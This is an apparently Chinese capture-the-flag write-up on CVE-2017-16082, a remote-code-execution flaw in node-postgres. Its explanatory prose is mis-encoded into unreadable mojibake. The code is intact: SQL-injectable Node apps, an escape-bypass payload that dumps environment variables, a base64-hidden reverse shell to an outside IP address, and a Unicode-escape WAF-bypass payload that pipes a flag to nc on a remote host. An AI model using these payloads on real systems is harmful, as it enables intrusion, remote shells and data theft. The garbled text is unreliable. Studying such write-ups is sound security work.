&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bye&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createHash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md5&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">digest&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hex&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`INSERT INTO users(username, password) VALUES(&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;, &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;) ON CONFLICT (username) DO NOTHING`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;;&amp;#34;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rows&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rowCount&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Reg OK&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User taken&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">31337&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Listen OK&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ¶‰åŠåˆ°çš„ä¸»è¦çŸ¥è¯†ç‚¹æœ‰ä¸‰ä¸ªï¼Œä¸€ä¸ªä¸€ä¸ªè¯´ã€‚&lt;/p>
&lt;h3 id="cve-2017-16082-node-progresql-rce">CVE-2017-16082: node-progresql-rce&lt;/h3>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html">node.js + postgres ä»Žæ³¨å…¥åˆ°Getshell&lt;/a> | vulhub: node/CVE-2017-16082 | &lt;a href="https://blog.csdn.net/weixin_39540651/article/details/108866593">PostgreSQL è®¤è¯æ–¹å¼è¯¦è§£&lt;/a>&lt;/p>
&lt;p>dockerä¸­çš„ç¤ºä¾‹app.jsï¼Œä¹‹åŽè¿žä¸Šdockerä¸­çš„app.jsç”¨vscodeè¿œç¨‹è°ƒè¯•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pg&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">client&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Client&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;postgres&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;postgres&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">database&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;db&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">5432&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT * FROM &amp;#34;user&amp;#34; WHERE &amp;#34;id&amp;#34; = &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`&amp;lt;html&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;body&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;table&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;id&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;name&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;score&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">score&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;/table&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;/body&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;/html&amp;gt;`&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¾ç„¶17è¡Œçš„&lt;code>let sql = &lt;/code>è¯­å¥æœ‰sqlçš„å¯èƒ½ï¼Œä¸è¿‡æ³¨æ„è¿™é‡Œçš„å¯æŽ§å‚æ•°åœ¨whereä¹‹åŽè€Œä¸åœ¨selectä¹‹åŽï¼Œæˆ‘ä»¬æ²¡æ³•è½»æ˜“çš„æŽ§åˆ¶å­—æ®µåï¼Œå³ä½¿æ˜¯ç”¨è”åˆæŸ¥è¯¢&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">where&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">=-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#00a8c8">union&lt;/span> &lt;span style="color:#111">slect&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#d88200">&amp;#34;\\&amp;#39;+console.log(process.enc)]=null;//&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬äºŒä¸ªselectåŽçš„å­—æ®µåä¹Ÿä¸ä¼šè¢«postgresè¿”å›žï¼Œåªä¼šå›žæ˜¾ç¬¬ä¸€ä¸ªæŸ¥è¯¢ç»“æžœ&lt;/p>
&lt;p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æŽ¥æ‰§è¡Œå¤šè¯­å¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#00a8c8">as&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#39;+console.log(process.env)]=null;//&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šè¿”å›ž500ï¼Œä½†æ˜¯å·²ç»è¢«æ­£å¸¸æ‰§è¡Œè¯­å¥äº†ï¼Œæ‰“å°å‡ºäº†çŽ¯å¢ƒå˜é‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117162422478.png" alt="image-20211117162422478">&lt;/p>
&lt;p>åŽŸç†å‘¢ï¼Œå°±æ˜¯ç»å…¸çš„è½¬ä¹‰ä¸å…¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">inlineParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fieldName&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;\nthis[&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#75715e">// fields containing single quotes will break
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// the evaluated javascript unless they are escaped
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// see https://github.com/brianc/node-postgres/issues/507
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Addendum: However, we need to make sure to replace all
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// occurences of apostrophes, not just the first one.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// See https://github.com/brianc/node-postgres/issues/934
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fieldName&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;#39;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;\\&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#39;] = &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#d88200">&amp;#39;rowData[&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;] == null ? null : parsers[&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;](rowData[&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;]);&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>fileNameå°±æ˜¯å­—æ®µåï¼Œåªå¯¹å•å¼•å·å‰åŠ åæ–œæ &lt;code>fileName.replace(/'/g, &amp;quot;\\'&amp;quot;)&lt;/code>ï¼Œæˆ‘ä»¬åªè¦å†åŠ ä¸€ä¸ªåæ–œæ å°±èƒ½é€ƒé€¸äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†å¯æŽ§çš„å­—æ®µå&lt;/p>
&lt;p>æˆ‘ä»¬ä¸Šé¢çš„payloadä¼ å…¥ä¹‹åŽä¼šæ˜¯è¿™æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#d88200">&amp;#39;SELECT * FROM &amp;#34;user&amp;#34; WHERE &amp;#34;id&amp;#34; = 1;select 1 as &amp;#34;\\&amp;#39;&lt;/span> &lt;span style="color:#111">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#111">)]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯¶ï¼Œé—­åˆäº†ï¼›å¦‚æžœåœ¨ä¸­é—´è§£æžçš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°ä¼ å…¥Functionç±»çš„å‡½æ•°ä½“ctorBodyå€¼ä¸º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;\\&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">)]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">//&amp;#39;] = rowData[0] == null ? null : parsers[0](rowData[0]);
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¡®å®žï¼Œæ‰§è¡Œçš„å°±æ˜¯æˆ‘ä»¬çš„æ¶æ„è¯­å¥&lt;/p>
&lt;p>æž„é€ åå¼¹shellçš„pocï¼Œæ‰§è¡Œå³å¯åå¼¹shellï¼ˆä¸æˆåŠŸçš„è¯è®°å¾—æŠŠurlencodeçš„special charså‹¾ä¸Šï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">SELECT&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;\&amp;#39;]=0;require=process.mainModule.constructor._load;/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/p=require(`child_process`);/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/`cC8xMDEuMzUuMTE0LjEwNy84NDI2IDA+JjE=|base64 -d|bash`)//&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117164222973.png" alt="image-20211117164222973">&lt;/p>
&lt;p>å…¶ä¸­æ ¸å¿ƒpayloadåˆ†å‰²åŽç”¨b64ç¼–ç +åå¼•å·æ¥æ‰§è¡Œè¯­å¥ï¼›FunctionçŽ¯å¢ƒä¸‹æ²¡æœ‰&lt;code>require()&lt;/code>å‡½æ•°ï¼Œä¸èƒ½èŽ·å¾—&lt;code>child_process&lt;/code>æ¨¡å—ï¼Œä½¿ç”¨&lt;code>process.mainModule.constructor._load&lt;/code>æ¥ä»£æ›¿&lt;code>require&lt;/code>&lt;/p>
&lt;p>ä¿®å¤æ–¹æ³•æ˜¯å°†&lt;code>fileName.replace(/'/g, &amp;quot;\\'&amp;quot;)&lt;/code>ä¿®æ”¹ä¸º&lt;code>escape(fileName)&lt;/code>ï¼Œå¯¹å¤§éƒ¨åˆ†æœ‰é—®é¢˜å­—ç¬¦è¿›è¡Œè½¬ä¹‰&lt;/p>
&lt;h3 id="mysqlçš„max_allowed_packet">mysqlçš„&lt;code>max_allowed_packet&lt;/code>&lt;/h3>
&lt;p>é»˜è®¤æœ€å¤§16Mï¼Œè¶…è¿‡åˆ™å…³é—­è¿žæŽ¥ä¸æ‰§è¡Œsqlè¯­å¥ï¼Œä¸ä¼šæŠŠæˆ‘ä»¬æ­¤æ¬¡æŸ¥è¯¢çš„è®°å½•ä¿ç•™ä¸‹æ¥ï¼Œå¯ä»¥ç»•è¿‡waf&lt;/p>
&lt;h3 id="postgresqlç‰¹æ®Šè¯­å¥">postgresqlç‰¹æ®Šè¯­å¥&lt;/h3>
&lt;p>ç‰¹æ€§ï¼šæ”¯æŒå°†16è¿›åˆ¶çš„å€¼è½¬æ¢ä¸ºunicodeå­—ç¬¦ï¼Œå¹¶ä¸”å¯ä»¥è‡ªå®šä¹‰è½¬ä¹‰ç¬¦&lt;/p>
&lt;p>åˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥ç»•wafï¼Œç©ºæ ¼ç”¨&lt;code>\t&lt;/code>ç»•è¿‡ï¼Œè‡ªå®šä¹‰è½¬ä¹‰ç¬¦è®¾ä¸ºæ„Ÿå¹å·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&amp;#39;)\tON\tCONFLICT\t(username)\tDO\tUPDATE\tSET\tusername=&amp;#39;&amp;#39;\tRETURNING\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;,\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;,\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;,\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é“é¢˜çš„sqlæ³¨å…¥ç‚¹åœ¨updateä¹‹åŽ&lt;/p>
